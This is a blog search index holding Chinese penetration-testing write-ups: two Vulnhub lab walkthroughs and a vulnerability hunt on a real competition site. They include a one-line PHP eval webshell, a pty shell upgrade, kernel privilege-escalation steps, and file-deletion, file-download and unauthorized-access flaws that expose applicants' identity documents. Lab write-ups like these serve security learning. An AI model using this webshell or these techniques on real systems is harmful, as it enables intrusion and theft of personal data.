<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0day漏洞挖掘案例</title>
      <link href="/posts/a83ff7dd/"/>
      <url>/posts/a83ff7dd/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub之social-network打靶思路</title>
      <link href="/posts/c3d4ff92/"/>
      <url>/posts/c3d4ff92/</url>
      
        <content type="html"><![CDATA[<h1 id="一-Vulnhub之social-network打靶思路"><a href="#一-Vulnhub之social-network打靶思路" class="headerlink" title="一.Vulnhub之social network打靶思路"></a>一.Vulnhub之social network打靶思路</h1><h2 id="1-打靶思路总结"><a href="#1-打靶思路总结" class="headerlink" title="1.打靶思路总结"></a>1.打靶思路总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">信息收集-反弹shell-socks代理-提权</span><br><span class="line">* 攻击机：Kali，本机（windows10）</span><br><span class="line">* 目标靶机：social network</span><br></pre></td></tr></table></figure><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><p>在virtualbox装好靶机之后，直接使用kscan扫c段：</p><p><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024093117899.png" alt="image-20221024093117899"><br>开放22和5000端口，一个ssh，一个web，直接访问web服务，发现一个输入框<br><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024093522188.png" alt="image-20221024093522188"><br>dirsearch扫一下目录，发现存在admin目录</p><p><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024093725196.png" alt="image-20221024093725196"></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>看到python的flash框架以及提示输出内容到exec，想到可能是python反弹shell</p><p><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024094040360.png" alt="image-20221024094040360"></p><p>填入IP以及要监听的端口，直接复制反弹shell的语句到输入框中</p><p><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024094522505.png" alt="image-20221024094522505"><br>反弹shell成功：<br><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024094630347.png" alt="image-20221024094630347"><br>???直接就是root权限？提权操作用不上？这是中等难度的靶机？想到这里，感觉事情并不简单</p><h2 id="4-Docker逃逸"><a href="#4-Docker逃逸" class="headerlink" title="4.Docker逃逸"></a>4.Docker逃逸</h2><p>ls列以下文件，发现一个Dokerfile文件，估计是在docker容器中了，搞不好就是docker逃逸<br><strong>判断是否身处docker容器中的两个方法：</strong></p><p><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024095954228.png" alt="image-20221024095954228"></p><ul><li>查看根目录有无 .&#x2F;dockerenv文件ls &#x2F;.dockerenv或者find .</li><li>查看当前系统进程的cgroup信息   cat &#x2F;proc&#x2F;1&#x2F;cgroup</li></ul><p><img src="C:\Users\joker\AppData\Roaming\Typora\typora-user-images\image-20221024100129780.png" alt="image-20221024100129780"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub之jangow打靶思路</title>
      <link href="/posts/6da7162c/"/>
      <url>/posts/6da7162c/</url>
      
        <content type="html"><![CDATA[<h1 id="一-Vulnhub之jangow打靶思路"><a href="#一-Vulnhub之jangow打靶思路" class="headerlink" title="一. Vulnhub之jangow打靶思路"></a>一. Vulnhub之jangow打靶思路</h1><h2 id="1-打靶思路总结"><a href="#1-打靶思路总结" class="headerlink" title="1.  打靶思路总结"></a>1.  打靶思路总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">信息收集-命令执行-getshell-FTP登陆-不出网反弹shell-ptyshell-SSH登陆-dirtycow提权，最终拿到root权限，获取Flag。</span><br><span class="line">* 攻击机：Kali，本机</span><br><span class="line">* 目标靶机：jangow</span><br></pre></td></tr></table></figure><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><p>靶机IP：192.168.56.118，Nmap进行端口扫描，靶机开放80以及21FTP端口，尝试FTP弱口令是否能登陆，经测试，anoymous&#x2F;anoymous弱口令不存在。<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090413848.png" alt="image-20220906090413848"><br>随后访问80端口，web站点出现，PHP站点+Apache中间件。<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090652344.png" alt="image-20220906090652344"><br>尝试进行目录扫描：只发现了静态资源文件夹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090900177.png" alt="image-20220906090900177"></p><p>尝试访问其它界面：<a href="http://192.168.56.118/site/busque.php?buscar=">http://192.168.56.118/site/busque.php?buscar=</a></p><p>bp进行不断Fuzz，命令执行漏洞X1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906091733028.png" alt="image-20220906091733028"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906091758275.png" alt="image-20220906091758275"></p><h2 id="3-一句话木马Getshell"><a href="#3-一句话木马Getshell" class="headerlink" title="3.一句话木马Getshell"></a>3.一句话木马Getshell</h2><p>既然存在命令执行，尝试使用PHP反弹shell试试，PHP反弹shell失败，怀疑不出网</p><p>查看系统有无python，使用python反弹shell，nc没反应，大概率就是不出网</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906093246928.png" alt="image-20220906093246928"></p><p>随后转变思路，尝试echo一句话进去，哥斯拉生成php马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;ace&quot;]);&#x27;</span> &gt; ace.php</span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906093504511.png" alt="image-20220906093504511"></p><p>木马成功写入，使用哥斯拉连接，随后查看站点目录有无可用信息等，发现数据库连接信息，但是数据库服务未开启，但站点开启了21FTP端口，尝试此账号密码登陆失败。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094307307.png" alt="image-20220906094307307"></p><p>继续找别的敏感信息，随后再整站目录下发现另外一个数据库连接账号密码的备份文件。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094526336.png" alt="image-20220906094526336"></p><p>继续尝试用账号密码进行FTP登陆，提示登陆成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094945305.png" alt="image-20220906094945305"></p><p>随后cd到不同的目录中，查找文件，由于当前为www权限，进入目录很多无权限。进入到home目录下，发现关键信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906095339610.png" alt="image-20220906095339610"></p><p>jangow01文件夹下存放了user.txt，使用FTP命令下载到本地打开</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906095505639.png" alt="image-20220906095505639"></p><p>第一个Flag已拿到：d41d8cd98f00b204e9800998ecf8427e</p><h2 id="4-反弹Shell"><a href="#4-反弹Shell" class="headerlink" title="4.反弹Shell"></a>4.反弹Shell</h2><p>哥斯拉的中有不出网反弹shell的模块：RealCmd，填好参数后，尝试进行shell反弹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100009327.png" alt="image-20220906100009327"></p><p>本地nc监听4444即可：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100050613.png" alt="image-20220906100050613"></p><p>反弹成功，但是此时反弹回来的shell很多命令都没办法使用，比如top，vim，sudo等</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100408742.png" alt="image-20220906100408742"></p><p>如果此时目标主机存在python环境的话，我们可以尝试使用ptyshell可以实现简单的tty。</p><p>whereis python查看有无python环境，信息收集的时候我们已经得知，靶机有python3环境，于是直接运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100745376.png" alt="image-20220906100745376"></p><p>然后就可以尝试各种命令了，再查看端口的时候，发现开放了22SSH端口：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101132959.png" alt="image-20220906101132959"></p><p>如果可以SSH登陆进去，那就很方便了。</p><p>尝试SSH登陆，使用刚刚的FTP账号密码进行尝试。哦吼，登陆成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101345677.png" alt="image-20220906101345677"></p><h2 id="5-提权（1）"><a href="#5-提权（1）" class="headerlink" title="5.提权（1）"></a>5.提权（1）</h2><p>目前针对这台主机已经拿下webshell，FTP账号密码，SSH账号密码，但是shell权限是www，无法查看root下的文件，那就提权。</p><p>uname -a 得知是ubuntu 4.4.0，，Kali直接：searchspolit 4.4.0</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101752814.png" alt="image-20220906101752814"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102009208.png" alt="image-20220906102009208"></p><p>也可直接百度搜索ubuntu 4.4.0提权等等，在此我使用的是脏牛或者CVE-2021-4034</p><p>首先查看目标主机是否安装gcc</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102738555.png" alt="image-20220906102738555"></p><p>随后上传CVE-2021-4034到&#x2F;tmp临时目录下，使用FTP上传或者哥斯拉上传都可以。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102915257.png" alt="image-20220906102915257"></p><p>随后进入到tmp目录下，随后编译此文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103132062.png" alt="image-20220906103132062"></p><p>编译成功后会在当前目录生成exp文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103211632.png" alt="image-20220906103211632"></p><p>随后.&#x2F;exp进行提权操作，成功提升至root权限！</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103301651.png" alt="image-20220906103301651"></p><p>进入root目录下查看文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103337556.png" alt="image-20220906103337556"></p><p>读取proof.txt，第二个Flag拿到</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103414524.png" alt="image-20220906103414524"></p><h2 id="6-提权（2）"><a href="#6-提权（2）" class="headerlink" title="6.提权（2）"></a>6.提权（2）</h2><p>继续使用脏牛提权</p><p>原理同上，上传至tmp目录下，随后进行编译</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103638276.png" alt="image-20220906103638276"></p><p>编译成功：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103854899.png" alt="image-20220906103854899"></p><p>进行提权：</p><p>然后系统死机了？？？打靶结束。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I创杯比赛官网漏洞挖掘</title>
      <link href="/posts/d21575e2/"/>
      <url>/posts/d21575e2/</url>
      
        <content type="html"><![CDATA[<h1 id="一-I创杯比赛官网漏洞挖掘"><a href="#一-I创杯比赛官网漏洞挖掘" class="headerlink" title="一.I创杯比赛官网漏洞挖掘"></a>一.I创杯比赛官网漏洞挖掘</h1><h2 id="1-外围打点"><a href="#1-外围打点" class="headerlink" title="1.外围打点"></a>1.外围打点</h2><p>针对该系统进行信息收集，子域名，端口开放，脚本语言，服务器类型，中间件类型，包括官网里的公众号（经验证，公众号和网站一致），敏感目录扫描等等。</p><h2 id="2-逐个测试"><a href="#2-逐个测试" class="headerlink" title="2.逐个测试"></a>2.逐个测试</h2><p>前期的信息收集完毕，着手针对系统进行测试，findsomething发现了几个带参数id的url，尝试进行SQL注入。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823183801895.png" alt="1"></p><p>单引号测试一下直接拦截，不断fuzz看看到底是哪个参数被拦截了……然后由于站点的waf以及防护策略就此作罢。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184109448.png" alt="2"></p><p>继续测试别的点，经测试，xss被拦截，..&#x2F;..&#x2F;..&#x2F;被拦截。几乎所有涉及到敏感操作的都会被拦截，继续测逻辑。</p><h2 id="3-柳暗花明"><a href="#3-柳暗花明" class="headerlink" title="3.柳暗花明"></a>3.柳暗花明</h2><p>因为是个报名网站，所以难免有注册登陆以及找回密码等选项，试试能否挖出来逻辑洞。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184736113.png" alt="3"></p><p>注册登陆之后，测一下越权&#x2F;未授权等等。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823184839269.png" alt="4"></p><p>基于sessionid做鉴权，暂无越权什么的，个人信息更新框也用了正则杜绝特殊字符的输入。<br>尝试退出，在找回密码处测试验证码回显、密码找回等漏洞，发现验证码功能没办法正常使用，于是继续进入个人中心页面，发现个人中心的URL有些不一样，尝试删除目录，逐级往前，然后出来了一个活动报名界面。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823185312390.png" alt="5"></p><p>点击进入，页面跳转，来到一个报名处，点击参赛报名，然后填写个人信息，按照要求一步一步填写，在第二个步骤界面，出现了一个上传点。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823185622773.png" alt="6"></p><p>好家伙，终于来了，但是无奈的是上传不了脚本文件，白名单限制了，绕不过去。但是可以正常上传图片等类型。还可以进行图片预览与删除。</p><h2 id="4-文件删除漏洞x1"><a href="#4-文件删除漏洞x1" class="headerlink" title="4.文件删除漏洞x1"></a>4.文件删除漏洞x1</h2><p>在删除图片的时候，bp抓到的包，其中一个Key参数很可疑，type是文件操作类型</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190012154.png" alt="7"></p><p>将数据包发送到repeater界面重放：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190241880.png" alt="8"></p><p>第一次放包是获取上传图片的名称与Key的值，第二次重放是进行删除操作：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190531537.png" alt="9"></p><p>尝试访问图片得到404，删除成功，更改Key的值进行尝试，文件删除漏洞x1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823190653151.png" alt="10"></p><h2 id="5-JS审计再出洞"><a href="#5-JS审计再出洞" class="headerlink" title="5.JS审计再出洞"></a>5.JS审计再出洞</h2><p>既然已经挖到了一个接口存在文件删除，那就继续挖下去。查看网站源代码，发现了又一处接口：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191042611.png" alt="11">    </p><p>这个Key似曾相识啊，这不就是刚刚的文件删除的参数么，看代码意思为展示图片（文件)的意思，于是将刚刚获取到的文件Key值进行拼接操作，文件下载x1：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191358799.png" alt="12"></p><p>根据图片中给出的json数据可以得知文件下载的URL需要一个ID值，猜测这个ID值就是Key&#x3D;IDxxxx中的xxxx，继续构造URL进行测试，于是：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823191742221.png" alt="13"></p><p>此时可遍历ID值进行文件下载，由于参赛报名涉及到实名制（个人身份证等图片)，不再放出。</p><h2 id="6-转换思路-未授权到手"><a href="#6-转换思路-未授权到手" class="headerlink" title="6.转换思路-未授权到手"></a>6.转换思路-未授权到手</h2><p>不管是刚刚的删除文件操作还是下载文件，网站URL路径中都有一个SessionID参数，不妨尝试一下删除SessionID参数值进行未授权操作，未授权x1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220823192412621.png" alt="14"></p><p>此处仍可遍历Key的值来进行未授权访问，Key表示文件（图片）的标识，未授权下方给出的是（图片）文件的URL，直接访问可得到敏感信息（包括身份证等信息)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
